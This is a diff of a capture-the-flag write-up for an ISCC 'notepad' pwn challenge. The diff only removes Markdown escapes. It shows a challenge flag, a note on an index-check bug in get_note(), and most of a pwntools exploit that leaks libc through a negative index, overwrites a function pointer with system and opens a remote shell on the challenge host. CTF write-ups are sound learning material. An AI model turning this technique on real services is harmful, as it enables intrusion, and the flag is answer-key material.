@@ -37,7 +37,7 @@ Name: ISCC{852cf33a-405c-43ec-a909-baa7ec41a5a2}
 
 -   View Note
 
-核心漏洞在 get\_note()：
+核心漏洞在 get_note()：
 
 if (idx &gt; 9) {
 
@@ -82,21 +82,21 @@ EXP
 
 from pathlib import Path
 
-from pwn import \*
+from pwn import *
 
 context.binary = elf = ELF("notepad")
 
 libc = ELF("libc.so.6")
 
-context.log\_level = "info"
+context.log_level = "info"
 
 HOST = "39.96.193.120"
 
 PORT = 10005
 
-REMOTE\_PRINTF = 0x61C90
+REMOTE_PRINTF = 0x61C90
 
-REMOTE\_SYSTEM = 0x52290
+REMOTE_SYSTEM = 0x52290
 
 def menu(io, choice):
 
@@ -128,7 +128,7 @@ name = io.recvuntil(b"Content: ", drop=True)
 
 if name.endswith(b"\\n"):
 
-name = name\[:-1\]
+name = name[:-1]
 
 content = io.recvline(False)
 
@@ -140,33 +140,33 @@ io = remote("39.96.193.120",10005)
 
 create(io, 0, b"/bin/sh\\x00", b"\\x00")
 
-leak\_name, \_ = view(io, -4)
+leak_name, _ = view(io, -4)
 
-printf\_leak = u64(leak\_name\[:6\].ljust(8, b"\\x00"))
+printf_leak = u64(leak_name[:6].ljust(8, b"\\x00"))
 
 if args.REMOTE:
 
-libc.address = printf\_leak - REMOTE\_PRINTF
+libc.address = printf_leak - REMOTE_PRINTF
 
-system = libc.address + REMOTE\_SYSTEM
+system = libc.address + REMOTE_SYSTEM
 
 else:
 
-libc.address = printf\_leak - libc.sym\["printf"\]
+libc.address = printf_leak - libc.sym["printf"]
 
-system = libc.sym\["system"\]
+system = libc.sym["system"]
 
-log.info(f"printf leak: {printf\_leak:\#x}")
+log.info(f"printf leak: {printf_leak:\#x}")
 
 log.info(f"libc base: {libc.address:\#x}")
 
 log.info(f"system: {system:\#x}")
 
-payload = b"A" \* 0x10
+payload = b"A" * 0x10
 
 payload += p64(0) + p64(0) + p64(system) + p64(0)
 
-create(io, -5, payload\[:0x10\], payload\[0x10:\])
+create(io, -5, payload[:0x10], payload[0x10:])
 
 menu(io, 2)
 
@@ -174,6 +174,6 @@ io.sendlineafter(b"Index: ", b"0")
 
 io.interactive()
 
-if \_\_name\_\_ == "\_\_main\_\_":
+if __name__ == "__main__":
 
 main()
